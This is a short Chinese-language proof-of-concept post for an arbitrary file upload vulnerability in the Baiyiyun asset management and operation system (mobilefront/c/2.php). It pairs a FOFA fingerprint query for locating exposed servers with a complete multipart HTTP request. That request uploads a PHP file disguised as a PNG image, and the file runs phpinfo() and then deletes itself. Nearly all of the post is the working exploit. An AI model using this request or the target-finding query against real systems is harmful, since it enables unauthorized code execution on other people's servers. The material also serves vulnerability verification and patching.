百易云资产管理运营系统mobilefront/c/2.php存在任意文件上传漏洞
手动复现过程
资产测绘：
FOFA：: body="不要着急，点此"
poc验证代码
POST /mobilefront/c/2.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
 
-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file1"; filename="2.php"
Content-Type: image/png
 
<?php phpinfo();unlink(__FILE__);?>
-----------------------------289666258334735365651210512949--
